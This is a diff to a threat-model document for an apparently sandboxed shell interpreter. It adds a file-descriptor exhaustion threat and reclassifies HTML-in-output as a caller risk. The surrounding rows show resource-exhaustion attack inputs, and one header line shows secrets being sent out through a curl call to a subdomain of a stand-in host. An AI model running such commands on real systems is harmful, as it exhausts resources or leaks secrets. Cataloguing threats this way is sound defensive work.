@@ -110,6 +110,7 @@ through configurable limits.
 | Param expansion bomb (TM-DOS-059) | `${x//a/bigstring}` multiplicative amplification | `max_total_variable_bytes` + `max_stdout_bytes` | MITIGATED |
 | Sparse array huge-index (TM-DOS-060) | `arr[999999999]=x` | HashMap storage; `max_array_entries` | MITIGATED |
 | Snapshot restore bypasses function/parser limits (TM-DOS-061) | Crafted snapshot with oversized/deep function bodies | Re-parse restored function source under current limits; re-check function memory budget | MITIGATED |
+| Persistent fd exhaustion (TM-DOS-063) | `exec N>/tmp/f` across many `N` values | `max_file_descriptors` caps custom persistent descriptors | MITIGATED |
 
 **Configuration:**
 ```rust
@@ -378,7 +379,7 @@ exfiltration by encoding secrets in subdomains (`curl https://$SECRET.example.co
 
 | Threat | Attack Example | Mitigation | Status |
 |--------|---------------|------------|--------|
-| HTML in output (TM-INJ-007) | Script outputs `<script>` | N/A (CLI tool) | NOT APPLICABLE |
+| HTML in output (TM-INJ-007) | Script outputs `<script>` and caller renders output in a web UI | Caller should HTML-escape output and use a restrictive CSP | CALLER RISK |
 | Terminal escapes (TM-INJ-008) | ANSI sequences in output | Caller should sanitize | CALLER RISK |
 
 **Internal State:**
